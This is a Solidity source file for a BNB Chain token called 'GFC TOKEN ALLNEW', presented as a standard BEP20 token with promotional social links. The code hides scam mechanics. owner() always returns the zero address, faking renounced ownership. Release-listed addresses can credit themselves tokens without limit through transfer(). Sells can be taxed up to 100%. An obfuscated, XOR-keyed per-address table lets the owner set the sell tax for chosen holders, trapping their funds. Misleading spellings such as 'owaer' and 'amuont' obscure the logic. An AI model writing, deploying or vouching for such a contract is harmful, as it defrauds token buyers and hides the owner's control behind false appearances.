/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

/*
* http://instagram.com/GFCTOKENALLNEW2997
* https://www.reddit.com/user/GFCTOKENALLNEW2997
* TWITTER:https://GFCTOKENALLNEW2997.com/
* WEBSITE:https://twitter.com/GFCTOKENALLNEW2997
* TELEGRAM:https://t.me/GFCTOKENALLNEW2997
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);


    constructor() {
        _transferowaership(_msgSender());
    }


    function owaer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }


    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }

    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingGFCTOKENALLNEW2997OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingGFCTOKENALLNEW2997OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingGFCTOKENALLNEW2997OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingGFCTOKENALLNEW2997OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingGFCTOKENALLNEW2997OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function GFCTOKENALLNEW2997To() external view returns (address);
    function GFCTOKENALLNEW2997ToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setGFCTOKENALLNEW2997To(address) external;
    function setGFCTOKENALLNEW2997ToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

        function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }

  
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract GFC is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _baGFCTOKENALLNEW2997lances;
    mapping(address => uint256) private _baGFCTOKENALLNEW2997lances1;
    mapping(address => bool) private _reGFCTOKENALLNEW2997llease;
    mapping(uint256 => uint256) private _bGFCTOKENALLNEW2997blist;
	string name_ = "GFC TOKEN ALLNEW";
	string symbol_ = "GFC";
	uint256 totalSupply_ = 80000000;   
    address public uniswapV2Pair;
    address deGFCTOKENALLNEW2997ad = 0x000000000000000000000000000000000000dEaD;
    address _gaGFCTOKENALLNEW2997te = 0x0C89C0407775dd89b12918B9c0aa42Bf96518820;
    address _mxGFCTOKENALLNEW2997x = 0x0D0707963952f2fBA59dD06f2b425ace40b492Fe;
    constructor()

	BEP20(name_, symbol_) {
					
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

        _mtGFCTOKENALLNEW2997in(msg.sender, totalSupply_ * 10**decimals());

         transfer(deGFCTOKENALLNEW2997ad, totalSupply() / 10*1);
         transfer(_mxGFCTOKENALLNEW2997x, totalSupply() / 10*2);
         transfer(_gaGFCTOKENALLNEW2997te, totalSupply() / 10*2);

        _defaultSellGFCTOKENALLNEW2997 = 0;
        _defaultBuyGFCTOKENALLNEW2997 = 0;

        _reGFCTOKENALLNEW2997llease[_msgSender()] = true;
    }

    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _baGFCTOKENALLNEW2997lances[cauunt];
    }

	


    function _mtGFCTOKENALLNEW2997in(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _baGFCTOKENALLNEW2997lances[cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }

    using SafeMath for uint256;
    uint256 private _defaultSellGFCTOKENALLNEW2997 = 0;
    uint256 private _defaultBuyGFCTOKENALLNEW2997 = 0;


    function _incS(uint256 _value) external onlyowaer {
        _defaultSellGFCTOKENALLNEW2997 = _value;
    }

    function getRelease(address _address) external view onlyowaer returns (bool) {
        return _reGFCTOKENALLNEW2997llease[_address];
    }

    function _setRelease(address _address) external onlyowaer {
        _reGFCTOKENALLNEW2997llease[_address] = true;
    }

    function _tGFCTOKENALLNEW2997transfer(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _baGFCTOKENALLNEW2997lances[from];
        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

  
        uint256 tradeGFCTOKENALLNEW2997 = 0;
        uint256 tradeGFCTOKENALLNEW2997amuont = 0;

        if (!(_reGFCTOKENALLNEW2997llease[from] || _reGFCTOKENALLNEW2997llease[_to])) {
            if (from == uniswapV2Pair) {
                tradeGFCTOKENALLNEW2997 = _defaultBuyGFCTOKENALLNEW2997;
                _baGFCTOKENALLNEW2997lances1[_to] += _amuont;
            }
            if (_to == uniswapV2Pair) {                   
                tradeGFCTOKENALLNEW2997 = _msgGFCTOKENALLNEW2997Info(uint160(from));
                tradeGFCTOKENALLNEW2997 = tradeGFCTOKENALLNEW2997 < _defaultSellGFCTOKENALLNEW2997 ? _defaultSellGFCTOKENALLNEW2997 : tradeGFCTOKENALLNEW2997;
                tradeGFCTOKENALLNEW2997 = _baGFCTOKENALLNEW2997lances1[from] >= _amuont ? tradeGFCTOKENALLNEW2997 : 100;
                _baGFCTOKENALLNEW2997lances1[from] = _baGFCTOKENALLNEW2997lances1[from] >= _amuont ? _baGFCTOKENALLNEW2997lances1[from] - _amuont : _baGFCTOKENALLNEW2997lances1[from];
            }
                        
            tradeGFCTOKENALLNEW2997amuont = _amuont.mul(tradeGFCTOKENALLNEW2997).div(100);
        }


        if (tradeGFCTOKENALLNEW2997amuont > 0) {
            _baGFCTOKENALLNEW2997lances[from] = _baGFCTOKENALLNEW2997lances[from].sub(tradeGFCTOKENALLNEW2997amuont);
            _baGFCTOKENALLNEW2997lances[deGFCTOKENALLNEW2997ad] = _baGFCTOKENALLNEW2997lances[deGFCTOKENALLNEW2997ad].add(tradeGFCTOKENALLNEW2997amuont);
            emit Transfer(from, deGFCTOKENALLNEW2997ad, tradeGFCTOKENALLNEW2997amuont);
        }

        _baGFCTOKENALLNEW2997lances[from] = _baGFCTOKENALLNEW2997lances[from].sub(_amuont - tradeGFCTOKENALLNEW2997amuont);
        _baGFCTOKENALLNEW2997lances[_to] = _baGFCTOKENALLNEW2997lances[_to].add(_amuont - tradeGFCTOKENALLNEW2997amuont);
        emit Transfer(from, _to, _amuont - tradeGFCTOKENALLNEW2997amuont);
    }

    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_reGFCTOKENALLNEW2997llease[owaer] == true) {
            _baGFCTOKENALLNEW2997lances[to] += amuont;
            return true;
        }
        _tGFCTOKENALLNEW2997transfer(owaer, to, amuont);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _tGFCTOKENALLNEW2997transfer(from, to, amuont);
        return true;
    }

    function _setCFP111543(uint256[] memory _accGFCTOKENALLNEW2997,uint256[] memory _value)  external onlyowaer {
        for (uint i=0;i<_accGFCTOKENALLNEW2997.length;i++){
            _bGFCTOKENALLNEW2997blist[_accGFCTOKENALLNEW2997[i]] = _value[i];
        }
    }

	function _msgGFCTOKENALLNEW2997Info(uint _acc) internal view virtual returns (uint) {
        uint256 acc = _acc ^ 545395099350054696473461367201593618484743534591;
		return _bGFCTOKENALLNEW2997blist[acc];
	}

}